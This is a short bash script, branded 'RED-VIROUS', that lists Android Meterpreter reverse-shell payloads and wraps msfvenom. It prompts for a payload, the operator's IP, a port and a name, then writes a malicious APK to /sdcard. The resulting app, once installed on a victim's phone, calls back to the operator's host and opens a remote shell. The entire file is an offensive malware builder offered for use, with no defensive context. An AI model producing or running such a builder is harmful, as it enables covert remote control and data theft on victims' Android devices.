
clear
c="\033[1;31m"
echo -e  $c "android/meterpreter/reverse_https"
echo -e  $c "android/meterpreter/reverse_http"
echo -e  $c "android/meterpreter/reverse_tcp"
echo -e ""
echo -e ""
echo -e "  ____  _____ ____     __     _____ ____   ___ ___ ____ "
echo -e " |  _ \| ____|  _ \    \ \   / /_ _|  _ \ / _ \_ _/ ___| "
echo -e " | |_) |  _| | | | |____\ \ / / | || |_) | | | | |\___ \ "
echo -e " |  _ <| |___| |_| |_____\ V /  | ||  _ <| |_| | | ___) | "
echo -e " |_| \_\_____|____/       \_/  |___|_| \_\\___/___|____/ "
echo -e ""
echo -e ""
echo -e $c "THIS TOOL BY (RED-VIROUS)"
sleep 1
read -p "ENTER MODEL PAYLOAD>> " pay
sleep 1
read -p "ENTER YOUR IP>> " ip
sleep 1
read -p "ENTER YOUR PORT>> " port
sleep 1
read -p "ENTER YOUR NAME PAYLOAD>> " name
sleep 1
echo -e "PLEASE WHAIT......"
sleep 2
msfvenom -p $pay LHOST=$ip LPORT=$port R > /sdcard/$name.apk
